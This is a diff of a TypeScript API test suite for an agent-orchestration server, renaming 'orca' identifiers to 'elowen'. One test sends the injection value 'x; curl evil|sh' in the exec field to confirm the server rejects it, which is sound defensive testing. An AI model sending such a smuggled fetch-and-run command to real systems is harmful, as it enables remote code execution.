@@ -4,7 +4,7 @@ import { TaskStore } from '../../src/store/taskStore.js';
 import { Readiness } from '../../src/store/readiness.js';
 import { MissionStore } from '../../src/store/missionStore.js';
 import { EventBus } from '../../src/api/sse.js';
-import type { OrcaEvent } from '../../src/api/sse.js';
+import type { ElowenEvent } from '../../src/api/sse.js';
 import { createServer } from '../../src/api/server.js';
 import { FakeTmuxDriver } from '../../src/tmux/fakeDriver.js';
 import { AgentStore } from '../../src/store/agentStore.js';
@@ -16,7 +16,7 @@ import { ProjectStore } from '../../src/store/projectStore.js';
 import { FakeInference } from '../../src/inference/client.js';
 
 function makeApp() {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db);
   const bus = new EventBus();
   const a = createServer({ tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus, engine: null as any, spawn: null as any, tmux: null as any, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db) });
@@ -39,12 +39,12 @@ describe('api', () => {
   });
   it('POST /tasks creates and GET /tasks lists it', async () => {
     const { app } = makeApp();
-    await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'orca-1', project_id: 1, title: 'X' }) });
+    await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'elowen-1', project_id: 1, title: 'X' }) });
     const list = await (await app.request('/tasks')).json();
-    expect(list.map((t: { id: string }) => t.id)).toEqual(['orca-1']);
+    expect(list.map((t: { id: string }) => t.id)).toEqual(['elowen-1']);
   });
   it('GET /tasks?project_id=N narrows the list to one project; unknown id yields []', async () => {
-    const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o'),(2,'other','/p')").run();
+    const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o'),(2,'other','/p')").run();
     const tasks = new TaskStore(db);
     const projects = new ProjectStore(db);
     const app = createServer({ tasks, projects, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(), engine: null as any, spawn: null as any, tmux: null as any, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db) });
@@ -61,16 +61,16 @@ describe('api', () => {
   });
   it('POST /tasks publishes a task SSE event', async () => {
     const { app, bus } = makeApp();
-    const events: OrcaEvent[] = [];
+    const events: ElowenEvent[] = [];
     bus.subscribe(e => events.push(e));
-    await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'orca-2', project_id: 1, title: 'Y' }) });
+    await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'elowen-2', project_id: 1, title: 'Y' }) });
     expect(events).toHaveLength(1);
-    expect(events[0]).toMatchObject({ type: 'task', taskId: 'orca-2', status: 'open' });
+    expect(events[0]).toMatchObject({ type: 'task', taskId: 'elowen-2', status: 'open' });
   });
 });
 
 it('POST /tasks with body {title} generates an id and sets status open', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db);
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
@@ -88,62 +88,62 @@ it('POST /tasks with body {title} generates an id and sets status open', async (
 });
 
 it('POST /sessions with invalid exec returns 400 and spawns nothing', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
-  const tasks = new TaskStore(db); tasks.create({ id: 'orca-1', project_id: 1, title: 'X' });
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
+  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
   const tmux = new FakeTmuxDriver();
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
     project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
-  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'x; curl evil|sh' }) });
+  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'x; curl evil|sh' }) });
   expect(res.status).toBe(400);
   expect(await res.json()).toMatchObject({ error: 'exec not allowed' });
   expect(await tmux.list()).toHaveLength(0);
 });
 
 it('POST /sessions launches an agent on a task and marks it in_progress', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
-  const tasks = new TaskStore(db); tasks.create({ id: 'orca-1', project_id: 1, title: 'X' });
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
+  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
   const tmux = new FakeTmuxDriver();
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
     project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
-  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
+  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
   expect(res.status).toBe(201);
   const body = await res.json();
-  expect(body.session).toMatch(/^orca-/);
-  expect(tasks.get('orca-1')?.status).toBe('in_progress');
+  expect(body.session).toMatch(/^elowen-/);
+  expect(tasks.get('elowen-1')?.status).toBe('in_progress');
   expect(await tmux.list()).toContain(body.session);
   // spawn tags the task with exec + agent labels so the UI can show its model and link the session
-  const t1 = tasks.get('orca-1')!;
+  const t1 = tasks.get('elowen-1')!;
   expect(t1.labels).toContain('exec:ollama-cloud/deepseek-v4-flash');
   expect(t1.labels.some((l) => l.startsWith('agent:'))).toBe(true);
 });
 
 it('POST /sessions refuses to launch into a shared checkout another agent already holds (409)', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db);
   tasks.create({ id: 'busy', project_id: 1, title: 'Busy' });
   tasks.setStatus('busy', 'in_progress'); // a live agent already owns the project's shared checkout
-  tasks.create({ id: 'orca-1', project_id: 1, title: 'X' });
+  tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
   const tmux = new FakeTmuxDriver();
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
     project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
-  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'sonnet' }) });
+  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'sonnet' }) });
   expect(res.status).toBe(409); // single-writer: don't double-occupy the checkout
-  expect(tasks.get('orca-1')?.status).toBe('open'); // not flipped
+  expect(tasks.get('elowen-1')?.status).toBe('open'); // not flipped
   expect(await tmux.list()).toHaveLength(0);         // nothing spawned
 });
 
 it('GET /sessions tags each live session with its project from the agent store', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (7,'orca','/o')").run();
-  const tasks = new TaskStore(db); tasks.create({ id: 'orca-1', project_id: 7, title: 'X' });
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (7,'elowen','/o')").run();
+  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 7, title: 'X' });
   const tmux = new FakeTmuxDriver();
   const agents = new AgentStore(db);
   const app = createServer({
@@ -151,7 +151,7 @@ it('GET /sessions tags each live session with its project from the agent store',
     engine: null as any, spawn: new SpawnService({ tmux, agents }), tmux, agents,
     project: { id: 7, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
-  await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
+  await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
   const sessions = await (await app.request('/sessions')).json();
   expect(sessions).toHaveLength(1);
   // the daemon resolves the session's repo from the agent store (works for every role, not just workers)
@@ -159,7 +159,7 @@ it('GET /sessions tags each live session with its project from the agent store',
 });
 
 it('PATCH /missions/:id pauses (drops from active) and resumes', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const missions = new MissionStore(db);
   missions.create({ id: 'm1', epic_id: 'e1', autonomy: 'L3', max_sessions: 1 });
   const tmux = new FakeTmuxDriver();
@@ -177,8 +177,8 @@ it('PATCH /missions/:id pauses (drops from active) and resumes', async () => {
 });
 
 it('POST /sessions rejects an exec disallowed by config', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
-  const tasks = new TaskStore(db); tasks.create({ id: 'orca-1', project_id: 1, title: 'X' });
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
+  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
   const config = new ConfigStore(db); config.update({ allowedExecs: ['sonnet'] }); // only sonnet allowed
   const tmux = new FakeTmuxDriver();
   const app = createServer({
@@ -186,21 +186,21 @@ it('POST /sessions rejects an exec disallowed by config', async () => {
     engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
     project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
   });
-  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'codex:gpt-5.4' }) });
+  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'codex:gpt-5.4' }) });
   expect(res.status).toBe(400);
   expect(await tmux.list()).toEqual([]);
 });
 
 it('GET /sessions/:name/stream survives a dead/missing session (empty pane)', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
-  const tmux = new FakeTmuxDriver(); // no pane set for 'orca-dead' → returns ''
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
+  const tmux = new FakeTmuxDriver(); // no pane set for 'elowen-dead' → returns ''
   const app = createServer({
     tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: null as any, tmux, project: { id: 1, path: '/o' },
     fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   const ctrl = new AbortController();
-  const res = await app.request('/sessions/orca-dead/stream', { signal: ctrl.signal });
+  const res = await app.request('/sessions/elowen-dead/stream', { signal: ctrl.signal });
   expect(res.status).toBe(200);
   expect(res.headers.get('content-type')).toContain('text/event-stream');
   const reader = res.body!.getReader();
@@ -213,15 +213,15 @@ it('GET /sessions/:name/stream survives a dead/missing session (empty pane)', as
 });
 
 it('GET /sessions/:name/stream emits a first pane frame', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
-  const tmux = new FakeTmuxDriver(); tmux.setPane('orca-A', 'hello-pane');
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
+  const tmux = new FakeTmuxDriver(); tmux.setPane('elowen-A', 'hello-pane');
   const app = createServer({
     tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: null as any, tmux, project: { id: 1, path: '/o' },
     fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
   const ctrl = new AbortController();
-  const res = await app.request('/sessions/orca-A/stream', { signal: ctrl.signal });
+  const res = await app.request('/sessions/elowen-A/stream', { signal: ctrl.signal });
   expect(res.status).toBe(200);
   expect(res.headers.get('content-type')).toContain('text/event-stream');
   const reader = res.body!.getReader();
@@ -236,7 +236,7 @@ it('GET /events flushes an initial comment so headers reach the client immediate
   // Through the web BFF proxy, a streamed response sends no HTTP headers until the first body byte.
   // The event bus is silent on a quiet system, so /events must emit an immediate SSE comment or the
   // dashboard's live channel never connects. Comments (lines starting with ':') are ignored by EventSource.
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const app = createServer({
     tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: null as any, tmux: new FakeTmuxDriver(), project: { id: 1, path: '/o' },
@@ -253,7 +253,7 @@ it('GET /events flushes an initial comment so headers reach the client immediate
 });
 
 it('GET /missions/:id returns 404 for unknown mission', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const app = createServer({
     tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: null as any, tmux: null as any,
@@ -264,7 +264,7 @@ it('GET /missions/:id returns 404 for unknown mission', async () => {
 });
 
 it('GET /missions/:id returns mission detail for a seeded mission', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db);
   const missions = new MissionStore(db);
   const app = createServer({
@@ -282,7 +282,7 @@ it('GET /missions/:id returns mission detail for a seeded mission', async () => 
 });
 
 it('GET /config returns masked config; PUT updates without exposing the key', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const config = new ConfigStore(db);
   const app = createServer({
     tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
@@ -309,16 +309,16 @@ it('GET /activity returns [] without an EventStore (legacy)', async () => {
 
 it('PATCH /tasks/:id sets the exec label', async () => {
   const { app } = makeApp();
-  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'orca-e', project_id: 1, title: 'E' }) });
-  const res = await app.request('/tasks/orca-e', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ exec: 'sonnet' }) });
+  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'elowen-e', project_id: 1, title: 'E' }) });
+  const res = await app.request('/tasks/elowen-e', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ exec: 'sonnet' }) });
   expect(res.status).toBe(200);
   expect((await res.json()).labels).toContain('exec:sonnet');
 });
 
 it('PATCH /tasks/:id updates title, type and priority', async () => {
   const { app } = makeApp();
-  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'orca-u', project_id: 1, title: 'Old' }) });
-  const res = await app.request('/tasks/orca-u', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'New', type: 'bug', priority: 'P0' }) });
+  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'elowen-u', project_id: 1, title: 'Old' }) });
+  const res = await app.request('/tasks/elowen-u', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'New', type: 'bug', priority: 'P0' }) });
   expect(res.status).toBe(200);
   const t = await res.json();
   expect(t.title).toBe('New'); expect(t.type).toBe('bug'); expect(t.priority).toBe('P0');
@@ -348,18 +348,18 @@ it('POST /tasks persists a description and PATCH updates it', async () => {
 
 it('DELETE /tasks/:id removes the task and publishes a cancelled event', async () => {
   const { app, bus } = makeApp();
-  const events: OrcaEvent[] = []; bus.subscribe(e => events.push(e));
-  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'orca-d', project_id: 1, title: 'Doomed' }) });
-  const res = await app.request('/tasks/orca-d', { method: 'DELETE' });
+  const events: ElowenEvent[] = []; bus.subscribe(e => events.push(e));
+  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'elowen-d', project_id: 1, title: 'Doomed' }) });
+  const res = await app.request('/tasks/elowen-d', { method: 'DELETE' });
   expect(res.status).toBe(200);
   const list = await (await app.request('/tasks')).json() as Array<{ id: string }>;
-  expect(list.some(t => t.id === 'orca-d')).toBe(false);
-  expect(events.some(e => e.type === 'task' && e.taskId === 'orca-d' && e.status === 'cancelled')).toBe(true);
+  expect(list.some(t => t.id === 'elowen-d')).toBe(false);
+  expect(events.some(e => e.type === 'task' && e.taskId === 'elowen-d' && e.status === 'cancelled')).toBe(true);
 });
 
 it('POST /tasks honours an explicit project_id (multi-project)', async () => {
   const db = openDb(':memory:');
-  db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   db.prepare("INSERT INTO projects (id,slug,path) VALUES (2,'other','/p2')").run();
   const tasks = new TaskStore(db);
   const app = createServer({
@@ -376,7 +376,7 @@ it('POST /tasks honours an explicit project_id (multi-project)', async () => {
 });
 
 it('POST /tasks rejects an unknown project_id with 404', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const app = createServer({
     tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: null as any, tmux: null as any,
@@ -395,7 +395,7 @@ it('POST /tasks/plan without an autopilot key returns 400', async () => {
 });
 
 it('POST /tasks/plan decomposes a goal into an epic with sequential phase subtasks', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db);
   const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
   const app = createServer({
@@ -420,7 +420,7 @@ it('POST /tasks/plan decomposes a goal into an epic with sequential phase subtas
 });
 
 it('POST /tasks/plan stores the model-assigned agent name as a label', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db);
   const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
   const app = createServer({
@@ -435,7 +435,7 @@ it('POST /tasks/plan stores the model-assigned agent name as a label', async () 
 });
 
 it('POST /tasks/plan with supplied phases skips the LLM and needs no key', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db);
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
@@ -451,7 +451,7 @@ it('POST /tasks/plan with supplied phases skips the LLM and needs no key', async
 });
 
 it('POST /tasks/plan dryRun returns phases without creating any tasks', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db);
   const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
   const app = createServer({
@@ -470,7 +470,7 @@ it('POST /tasks/plan dryRun returns phases without creating any tasks', async ()
 });
 
 it('POST /tasks/plan with engage=true engages a mission on the epic', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db);
   const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
   let engagedEpic = '';
@@ -489,7 +489,7 @@ it('POST /tasks/plan with engage=true engages a mission on the epic', async () =
 });
 
 it('POST /tasks/:epicId/phases inserts a phase chained after the epic\'s current tail', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db); const config = new ConfigStore(db);
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
@@ -510,7 +510,7 @@ it('POST /tasks/:epicId/phases inserts a phase chained after the epic\'s current
 });
 
 it('POST /tasks/:epicId/phases replans a residual goal into chained phases', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db); const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
@@ -529,7 +529,7 @@ it('POST /tasks/:epicId/phases replans a residual goal into chained phases', asy
 });
 
 it('POST /tasks/:epicId/phases — a DAG replan does not overtake the epic\'s unfinished frontier', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db); const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
@@ -549,7 +549,7 @@ it('POST /tasks/:epicId/phases — a DAG replan does not overtake the epic\'s un
 });
 
 it('POST /tasks/:epicId/phases returns 404 for a non-epic id', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const app = createServer({
     tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
     engine: null as any, spawn: null as any, tmux: null as any,
@@ -560,7 +560,7 @@ it('POST /tasks/:epicId/phases returns 404 for a non-epic id', async () => {
 });
 
 it('POST /tasks/:epicId/phases ticks an active mission so it picks up the new phase', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db); const config = new ConfigStore(db);
   let ticked = '';
   const engine = { isActive: (id: string) => id === 'm-E', tick: async (id: string) => { ticked = id; } } as unknown as MissionEngine;
@@ -588,22 +588,22 @@ it('returns 400 on a malformed JSON body (central onError, not a 500)', async ()
 });
 
 it('POST /sessions reverts the task to open when spawn.launch fails', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
   const tasks = new TaskStore(db);
-  tasks.create({ id: 'orca-s1', project_id: 1, title: 'T', description: 'd' });
+  tasks.create({ id: 'elowen-s1', project_id: 1, title: 'T', description: 'd' });
   const tmux = new FakeTmuxDriver();
   tmux.spawn = async () => { throw new Error('tmux exploded'); };
   const spawn = new SpawnService({ tmux, agents: new AgentStore(db) });
   const bus = new EventBus();
-  const events: OrcaEvent[] = []; bus.subscribe((e) => events.push(e));
+  const events: ElowenEvent[] = []; bus.subscribe((e) => events.push(e));
   const app = createServer({
     tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus,
     engine: null as any, spawn, tmux,
     project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
   });
-  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-s1' }) });
+  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-s1' }) });
   expect(res.status).toBe(500);
-  expect(tasks.get('orca-s1')!.status).toBe('open'); // reverted, not left stuck in_progress
-  expect(events.some((e) => e.type === 'task' && e.taskId === 'orca-s1' && e.status === 'open')).toBe(true);
+  expect(tasks.get('elowen-s1')!.status).toBe('open'); // reverted, not left stuck in_progress
+  expect(events.some((e) => e.type === 'task' && e.taskId === 'elowen-s1' && e.status === 'open')).toBe(true);
 });
 
